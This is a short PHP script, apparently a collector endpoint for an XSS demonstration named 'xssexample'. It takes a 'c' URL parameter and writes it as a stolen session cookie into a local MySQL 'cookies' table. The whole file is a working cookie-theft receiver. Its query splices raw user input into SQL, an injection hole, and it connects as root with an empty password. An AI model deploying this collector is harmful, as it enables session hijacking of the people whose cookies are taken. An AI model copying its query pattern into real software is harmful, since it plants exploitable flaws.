<?php
$Host= '127.0.0.1';
$Dbname= 'xssexample';
$User= 'root';
$Password= '';
$Schema = 'test';
    $Connect = mysql_connect("127.0.0.1",$User,$Password);
 if(isset($_GET['c'])) {
  $query="insert into $Dbname.cookies (session) values ('".$_GET['c']."')";
  mysql_query($query);
  echo "Update Success";
 }
?>
